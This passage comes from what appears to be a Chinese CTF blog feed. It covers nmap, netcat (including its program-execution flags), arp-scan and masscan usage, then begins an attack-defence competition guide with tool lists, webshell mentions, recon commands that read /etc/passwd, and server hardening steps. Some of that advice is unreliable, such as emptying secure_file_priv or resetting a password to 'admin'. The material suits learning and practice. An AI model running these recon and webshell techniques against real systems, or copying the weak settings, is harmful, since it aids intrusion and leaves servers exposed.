系统类型和内核版本</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:3</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>OS details: Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">3.16</span>   <span class=\"token comment\"># 内核版本范围</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop   <span class=\"token comment\"># 指示设备与扫描器之间的网络距离为 1 跳，表示它们在同一个局域网中。</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>Service Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">1.59</span> ms <span class=\"token number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">25.10</span> seconds</pre></td></tr></table></figure></details>\n<p>两个命令还不足以展现 nmap 的强大，在后面会深入学习</p>\n<h3 id=\"完整使用说明\"><a class=\"anchor\" href=\"#完整使用说明\">#</a> 完整使用说明</h3>\n<blockquote>\n<p>教程再好终归不如官方文档</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nc -h                 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>v1.10-47<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>连接:   <span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token function\">hostname</span> port<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>ports<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">..</span>. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>监听入站:     <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> port <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>hostname<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>options:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token parameter variable\">-c</span> shell commands       命令为“-e”；prog 程序重定向，使用 /bin/sh 执行 <span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token parameter variable\">-e</span> filename             连接后执行的程序<span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token parameter variable\">-b</span>                      允许广播</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token parameter variable\">-g</span> gateway              网关源路由跳跃点，最多 <span class=\"token number\">8</span> 个</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token parameter variable\">-G</span> num                  源路由指针：4, <span class=\"token number\">8</span>, <span class=\"token number\">12</span>, <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token parameter variable\">-h</span>                      this cruft  这个废话,就是帮助</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token parameter variable\">-i</span> secs                 发送线路、扫描端口的延迟间隔</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token parameter variable\">-k</span>                      设置套接字上的 keepalive 选项</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token parameter variable\">-l</span>                      监听模式，用于入站连接</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token parameter variable\">-n</span>                      仅数字 IP 地址，无 DNS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token parameter variable\">-o</span> <span class=\"token function\">file</span>                 文件十六进制转储流量</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token parameter variable\">-p</span> port                 本地端口号</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token parameter variable\">-r</span>                      随机化本地和远程端口</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token parameter variable\">-q</span> secs                 在 stdin 上的 EOF 和延迟秒后退出</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token parameter variable\">-s</span> addr                 本地源地址</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token parameter variable\">-T</span> tos                  设置服务类型</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token parameter variable\">-t</span>                      应答TELNET协商</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token parameter variable\">-u</span>                      UDP模式</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token parameter variable\">-v</span>                      verbose <span class=\"token punctuation\">[</span>使用两次以更加详细<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token parameter variable\">-w</span> secs                 连接和最终网络读取的超时时间</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token parameter variable\">-C</span>                      发送 CRLF 作为行结束符</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token parameter variable\">-z</span>                      零 I/O 模式 <span class=\"token punctuation\">[</span>用于扫描<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>port numbers can be individual or ranges: lo-hi <span class=\"token punctuation\">[</span>inclusive<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>hyphens <span class=\"token keyword\">in</span> port names must be backslash escaped <span class=\"token punctuation\">(</span>e.g. <span class=\"token string\">'ftp\\-data'</span><span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 端口号可以是单个端口号，也可以是范围：lo-hi [包含]；</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 端口名称中的连字符必须使用反斜杠转义（例如 “ftp\\-data”）。</span></pre></td></tr></table></figure><h1 id=\"后话\"><a class=\"anchor\" href=\"#后话\">#</a> 后话</h1>\n<p>nc、netcat、nmap……kali 还有多少不可估量的工具等着自己发掘</p>\n<h2 id=\"题外话1arp-scan\"><a class=\"anchor\" href=\"#题外话1arp-scan\">#</a> 题外话 1：<a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">arp-scan</a></h2>\n<p><strong>什么是 ARP</strong><br />\n 地址解析协议（Address Resolution Protocol），其基本功能为通过目标设备的 IP 地址，查询目标设备的 MAC 地址，以保证通信的顺利进行。 它是 IPv4 中网络层必不可少的协议，是根据 IP 地址获得物理地址 MAC 的一个 TCP/IP 协议。通过 ARP，在局域网可以很容易构成一个 ARP 欺骗，从而得到有用数据信息。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>作业</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-v</td>\n<td>显示详细的进度消息</td>\n</tr>\n<tr>\n<td>-V</td>\n<td>显示版本</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>使用网络接口</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>从文件中读取主机名或地址</td>\n</tr>\n<tr>\n<td>-I</td>\n<td>从接口地址和网络掩码（包括网络和广播）生成列表</td>\n</tr>\n</tbody>\n</table>\n<p>常用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">--localnet</span>   <span class=\"token comment\"># 发送 ARP 请求扫描本地网络中的活动主机，并显示它们的 MAC 地址和 IP 地址。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-I</span> eth0 <span class=\"token parameter variable\">--rtt</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># 在指定网络接口（例如 eth0）上执行 ARP 扫描，同时显示每个主机的往返时间（RTT）</span></pre></td></tr></table></figure><p><a href=\"https://cn.linuxos.info/command/arp-scan\">arp-scan - 参考手册、选项、命令示例 (linuxos.info)</a></p>\n<h2 id=\"题外话2masscan\"><a class=\"anchor\" href=\"#题外话2masscan\">#</a> 题外话 2：<a href=\"http://t.csdnimg.cn/2uU8h\">Masscan</a></h2>\n<blockquote>\n<p>Masscan 是一款快速、高性能的开源端口扫描工具，旨在以极高的速度扫描整个互联网的 IPv4 地址空间。它的设计目标是快速、灵活且适用于大规模的端口扫描任务。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>masscan <span class=\"token operator\">&lt;</span>IP或网段<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>端口号或端口范围<span class=\"token operator\">></span> <span class=\"token parameter variable\">--rate</span> <span class=\"token operator\">&lt;</span>每秒发送数据包数量<span class=\"token operator\">></span>（一般十万或一百万）</pre></td></tr></table></figure><p>其他参数详解：</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>--excludefile filename</td>\n<td>排除文件中的选项</td>\n</tr>\n<tr>\n<td>-oX filename</td>\n<td>输出到 filename 的 XML</td>\n</tr>\n<tr>\n<td>-oG filename</td>\n<td>输出到 filename 在的 grepable 格式</td>\n</tr>\n<tr>\n<td>-oJ filename</td>\n<td>输出到 filename 在 JSON 格式。</td>\n</tr>\n</tbody>\n</table>\n<p>主打一个快捷迅速</p>\n<h2 id=\"题外话3httpscan\"><a class=\"anchor\" href=\"#题外话3httpscan\">#</a> 题外话 3：<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></h2>\n<p><a href=\"https://github.com/zer0h/httpscan\">项目地址</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>httpscan.py <span class=\"token number\">192.168</span>.0.0/24 –t <span class=\"token number\">10</span></pre></td></tr></table></figure><blockquote>\n<p>httpscan 是一个扫描指定 CIDR 网段的 Web 主机的小工具。和端口扫描器不一样，httpscan 是以爬虫的方式进行 Web 主机发现，因此相对来说不容易被防火墙拦截。</p>\n</blockquote>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接：</h1>\n<p><a href=\"https://nmap.org/man/zh/index.html\">官方文档：</a><a href=\"https://nmap.org/man/zh/index.html\">https://nmap.org/man/zh/index.html</a></p>\n<p><a href=\"http://t.csdnimg.cn/iN9Wc\">http://t.csdnimg.cn/iN9Wc</a></p>\n<p><a href=\"http://t.csdnimg.cn/2uU8h\">http://t.csdnimg.cn/2uU8h</a></p>\n<p><a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">https://gitcode.com/royhills/arp-scan</a></p>\n",
            "tags": [
                "Penetration Test",
                "Attack and Defence",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "url": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "title": "AWD初体验",
            "date_published": "2024-04-14T04:40:23.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-14</span><br />\nPunhacker 即兴安排了一次 awd 攻防对抗赛，下午 4 点发通知晚上 8 点开始打两小时。<br />\n加固时间仅 10 分钟，而没有接触过 awd 不知道忙活什么地方，一边看着文章一边下载工具，仅 40 分钟被攻破 4 次……</p>\n<h1 id=\"awd攻略\"><a class=\"anchor\" href=\"#awd攻略\">#</a> AWD 攻略</h1>\n<h1 id=\"比赛流程\"><a class=\"anchor\" href=\"#比赛流程\">#</a> 比赛流程</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 SSH 或者 VNC 的用户名和密码，还有相关 IP 等信息</p>\n</li>\n<li class=\"lvl-2\">\n<p>安全加固环节：我们需要先自己去登录靶机服务器，进行 30 分钟的安全加固（源码备份 / 弱口令修改 / 代码审计和修复 / 漏洞修复等）</p>\n</li>\n<li class=\"lvl-2\">\n<p>自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令 / Web 漏洞 / 系统漏洞等）获得 Flag 进行加分，对应队伍失分</p>\n</li>\n</ul>\n<h1 id=\"赛前准备\"><a class=\"anchor\" href=\"#赛前准备\">#</a> 赛前准备</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>基础工具：<a href=\"https://portswigger.net/burp\">Burpsuite</a>、<a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a>、<a href=\"https://www.kali.org/\">kali</a>(nmap、masscan、nc、searchsploit、Metasploit、Hydra)、<a href=\"https://www.xshell.com/zh/xshell/\">Xshell</a>、<a href=\"https://www.xshell.com/zh/xftp/\">Xftp</a>、<a href=\"https://github.com/raddyfiy/caidao-official-version\">菜刀</a>或<a href=\"https://github.com/AntSwordProject/antSword\">蚁剑</a>、<a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>、Chrome、Firefox 各类插件（<a href=\"https://addons.mozilla.org/zh-CN/firefox/addon/hackbartool/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search\">hackbar</a>）、基础 waf（第三方 waf）、<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>图形化工具：Xterminal、Nessus（扫描工具）、TscanPlus、D 盾、代码审计工具（seay、Rips）</p>\n</li>\n<li class=\"lvl-2\">\n<p>一句话木马：php、asp、aspx、jsp、内存马</p>\n</li>\n<li class=\"lvl-2\">\n<p>代码审计工具：<a href=\"https://github.com/f1tz/cnseay\">seay</a>、Rips</p>\n</li>\n<li class=\"lvl-2\">\n<p><a href=\"http://t.csdnimg.cn/JmIxf\">不死马；反不死马</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>提前准备好各种 cms 的 poc exp （因为可能不允许联网）phpwin phpcms dz <a href=\"https://github.com/Mr-xn/Penetration_Testing_POC\">戳这里</a></p>\n</li>\n</ul>\n<h1 id=\"登录靶机\"><a class=\"anchor\" href=\"#登录靶机\">#</a> 登录靶机</h1>\n<h2 id=\"ssh登录注意端口\"><a class=\"anchor\" href=\"#ssh登录注意端口\">#</a> ssh 登录（注意端口）</h2>\n<blockquote>\n<p>windows：finalshell、Xshell<br />\nLinux： <code>ssh -p [port] [username]@[host]</code></p>\n</blockquote>\n<div class=\"note warning\">\n<p>注意：比赛通常都不会给 root 用户而是给一般用户，此时重点防御 <code>/var/html/</code>  下的服务，不用花过多时间去提权</p>\n</div>\n<h1 id=\"收集信息\"><a class=\"anchor\" href=\"#收集信息\">#</a> 收集信息</h1>\n<h2 id=\"明确linux机器信息\"><a class=\"anchor\" href=\"#明确linux机器信息\">#</a> 明确 Linux 机器信息</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span>                       //系统信息</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-aux</span>                        //查询进程信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> 进程名称         //筛选指定进程</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">id</span>                             //用于显示用户ID，以及所属群组ID</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">cat</span> /etc/passwd                //查看用户情况</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">ls</span> /home/                      //查看用户情况</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> d <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-002</span>      //可写目录检查</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">ifconfig</span>                       //Linux上查看网卡信息</pre></td></tr></table></figure><h2 id=\"查看服务\"><a class=\"anchor\" href=\"#查看服务\">#</a> 查看服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-nptl</span> <span class=\"token comment\"># 推荐使用，注意 Local Address 为 0.0.0.0 是公共访问，注意弱口令等</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24 <span class=\"token comment\"># 本机使用</span></pre></td></tr></table></figure><p>一般来说，各个靶机服务的端口是一样的，获取自己主机的端口活动情况，再获取其他主机的 ip 地址。然后就开始攻守的任务</p>\n<h2 id=\"查看开放端口\"><a class=\"anchor\" href=\"#查看开放端口\">#</a> 查看开放端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span>                                                       //查看活动连接</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">netstat</span> -ano/-a                                               //查看端口情况</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-anp</span>                                                  //查看端口</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--zone</span><span class=\"token operator\">=</span> public --remove-port<span class=\"token operator\">=</span><span class=\"token number\">80</span>/tcp –permanent   //关闭端口</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>firewall-cmd –reload                                          //防火墙重启</pre></td></tr></table></figure><h1 id=\"防守defence\"><a class=\"anchor\" href=\"#防守defence\">#</a> 防守（defence）</h1>\n<h2 id=\"查找本地flag\"><a class=\"anchor\" href=\"#查找本地flag\">#</a> 查找本地 flag</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token string\">\"flag\"</span> /var/www/html/  //Linux：在Web目录下查找flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>findstr /s /i <span class=\"token string\">\"flag\"</span> *.*       //Windows：当前目录以及所有子目录下的所有文件中查找<span class=\"token string\">\"flag\"</span>这个字符串</pre></td></tr></table></figure><p><strong>每一处 flag 都有洞，查看版本查询对应的 cve 进行进一步的加固</strong></p>\n<h2 id=\"修改密码\"><a class=\"anchor\" href=\"#修改密码\">#</a> 修改密码</h2>\n<p>若 ssh 登录时用的弱密码，则登录后马上改密码<br />\n弱口令密码更改<br />\n Mysql 密码默认都是 root，phpstudy 默认密码 123456</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@8 ~<span class=\"token punctuation\">]</span>$ <span class=\"token function\">passwd</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Changing password <span class=\"token keyword\">for</span> user root.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>New password: </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Retype new password: </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>passwd: all authentication tokens updated successfully.</pre></td></tr></table></figure><p>修改当前用户的密码，提权 root 后也可以修改 root 密码，若失败<a href=\"http://t.csdnimg.cn/FDcgD\">戳这里</a><br />\n同时 web 服务、web 后台管理员、数据库也都需要修改密码（不建议重复使用密码）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span> password <span class=\"token keyword\">for</span> root<span class=\"token variable\">@ip</span> <span class=\"token operator\">=</span> password<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- 或者</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">update</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">set</span> password <span class=\"token operator\">=</span> PASSWORD<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">where</span> <span class=\"token keyword\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- 重新加载授权表，使最新的权限更改生效</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flush <span class=\"token keyword\">privileges</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- 需要以具有足够权限的用户身份登录到 MySQL 数据库才能执行这些操作</span></pre></td></tr></table></figure><h2 id=\"备份\"><a class=\"anchor\" href=\"#备份\">#</a> 备份</h2>\n<h3 id=\"备份数据库\"><a class=\"anchor\" href=\"#备份数据库\">#</a> 备份数据库</h3>\n<p>找到数据库备份文件： <code>mysql --help|grep 'cnf'</code> ；<br />\n也可能在 <code>/var/lib/mysql</code>  下，或者 database.php<br />\n 找 <code>db_name</code> 、 <code>db_user</code>  和 <code>db_passwd</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">></span> bak.sql</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 备份指定数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysqldump --all-databases <span class=\"token operator\">></span> bak.sql </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 备份所有数据库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-uroot</span> <span class=\"token parameter variable\">-proot</span> --all-databases --skip-lock-tables <span class=\"token operator\">></span> /tmp/db.sql</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 无 lock tables 权限的解决方法</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">&lt;</span> bak.sql</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 还原指定数据库</span></pre></td></tr></table></figure><p>还原数据库也可以：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> test <span class=\"token punctuation\">;</span><span class=\"token comment\">-- 建立要还原的数据库</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">use</span> test<span class=\"token punctuation\">;</span><span class=\"token comment\">-- 切换到刚创建的数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> source test<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- 导入数据库</span></pre></td></tr></table></figure><h3 id=\"关闭-mysql-远程登录\"><a class=\"anchor\" href=\"#关闭-mysql-远程登录\">#</a> 关闭 MySQL 远程登录：</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ mysql <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> use mysql<span class=\"token punctuation\">;</span><span class=\"token comment\"># 切换数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> update user <span class=\"token builtin class-name\">set</span> <span class=\"token function\">host</span> <span class=\"token operator\">=</span> <span class=\"token string\">'localhost'</span> where <span class=\"token assign-left variable\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span> and <span class=\"token assign-left variable\">host</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> flush privileges<span class=\"token punctuation\">;</span><span class=\"token comment\"># 重新加载授权表，使最新的权限更改生效</span></pre></td></tr></table></figure><p>检查隐藏用户：查看 home 目录下是否有其他用户，/etc/passwd 是否有 /bin/bash 的用户</p>\n<blockquote>\n<p>对于 MySQL 的攻防，<a href=\"https://blog.zgsec.cn/archives/26.html\">戳这里</a></p>\n</blockquote>\n<p>MySQL 默认配置文件路径：</p>\n<blockquote>\n<p>C:\\Program Files\\MySQL\\MySQLServer 5.1\\my.ini   ------Windows<br />\n/etc/my.cnf ------Linux<br />\n/etc/mysql/my.cnf ------Linux</p>\n</blockquote>\n<p>修改 secure_file_priv 参数（日志功能的对应目录）<br />\n <code>secure_file_priv=&quot;&quot;</code></p>\n<p>重载 MySQL 配置<br />\n <code>FLUSH PRIVILEGES</code> <br />\n 重启 MySQL 服务</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mysql restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart mysql</pre></td></tr></table></figure><h2 id=\"web加固\"><a class=\"anchor\" href=\"#web加固\">#</a> web 加固</h2>\n<h3 id=\"设置权限\"><a class=\"anchor\" href=\"#设置权限\">#</a> 设置权限</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*.php <span class=\"token comment\"># php 文件需要执行权限</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html       <span class=\"token comment\"># Web 根目录设置只读和执行权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token parameter variable\">-R</span> <span class=\"token number\">644</span> /var/www          <span class=\"token comment\"># -R 递归设置</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 改变文件的属主和属组来设置严格的权限</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> root:root /var/www/html/  <span class=\"token comment\"># 设置拥有人为 root:root 或 httpd:httpd</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> apache:apache /var/www/html/ <span class=\"token comment\"># 确保 apache 拥有 /var/www/html/</span></pre></td></tr></table></figure><h3 id=\"网站备份\"><a class=\"anchor\" href=\"#网站备份\">#</a> 网站备份</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cvf</span> web.tar /var/www/html</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">zip</span> <span class=\"token parameter variable\">-q</span> <span class=\"token parameter variable\">-r</span> web.zip /var/www/html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 压缩源码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> web.tar <span class=\"token parameter variable\">-c</span> /var/www/html</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">unzip</span> web.zip <span class=\"token parameter variable\">-d</span> /var/www/html</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 解压缩源码</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">mv</span> web.zip /home/xxx</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 一定要移动不然源码泄露  </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">scp</span> username@servername:/path/filename /tmp/local_destination  <span 